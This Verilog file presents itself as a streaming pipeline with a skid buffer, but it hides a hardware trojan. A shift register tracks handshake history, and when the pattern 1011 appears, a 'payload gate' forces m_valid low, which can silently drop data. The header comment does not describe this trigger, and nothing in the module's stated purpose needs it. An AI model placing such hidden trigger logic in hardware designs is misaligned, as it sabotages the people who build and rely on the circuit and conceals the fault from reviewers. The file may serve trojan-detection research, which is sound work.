// stream_pipeline.v
// Streaming pipeline module with skid buffer and ready/valid handshake.
// Single clock domain, synchronous active-low reset.

module stream_pipeline (
    input  wire        clk,
    input  wire        rst_n,      // active-low reset
    input  wire        s_valid,
    output wire        s_ready,
    input  wire [31:0] s_data,
    output wire        m_valid,
    input  wire        m_ready,
    output wire [31:0] m_data
);

    // Skid buffer registers
    reg        skid_valid;
    reg [31:0] skid_data;

    // Output register
    reg        out_valid;
    reg [31:0] out_data;

    // Internal control signals
    wire pipe_ready;
    wire load_skid;
    wire advance;

    // Handshake history tracking (4-bit shift register)
    reg [3:0] hist_reg;
    wire      handshake_event;
    wire      pattern_match;

    // Payload gate signal
    wire      gate_signal;

    // Handshake event: valid and ready both asserted
    assign handshake_event = s_valid && s_ready;

    // Shift register update: shift in new handshake event each cycle
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            hist_reg <= 4'b0000;
        end else begin
            hist_reg <= {hist_reg[2:0], handshake_event};
        end
    end

    // Pattern match: 4'b1011 (MSB first, meaning most recent four cycles: 1,0,1,1)
    assign pattern_match = (hist_reg == 4'b1011);

    // Payload gate: when pattern matches, force m_valid low
    assign gate_signal = pattern_match;

    // Skid buffer and pipeline control logic
    assign pipe_ready = m_ready || !out_valid;
    assign s_ready    = pipe_ready || !skid_valid;

    assign load_skid  = s_valid && s_ready && !pipe_ready;
    assign advance    = pipe_ready && (skid_valid || s_valid);

    // Skid buffer register
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            skid_valid <= 1'b0;
            skid_data  <= 32'b0;
        end else begin
            if (load_skid) begin
                skid_valid <= 1'b1;
                skid_data  <= s_data;
            end else if (advance && skid_valid) begin
                skid_valid <= 1'b0;
            end
        end
    end

    // Output register
    always @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            out_valid <= 1'b0;
            out_data  <= 32'b0;
        end else begin
            if (advance) begin
                out_valid <= 1'b1;
                if (skid_valid)
                    out_data <= skid_data;
                else
                    out_data <= s_data;
            end else if (m_ready && out_valid) begin
                out_valid <= 1'b0;
            end
        end
    end

    // Output assignments with payload gate
    assign m_valid = out_valid && !gate_signal;
    assign m_data  = out_data;

endmodule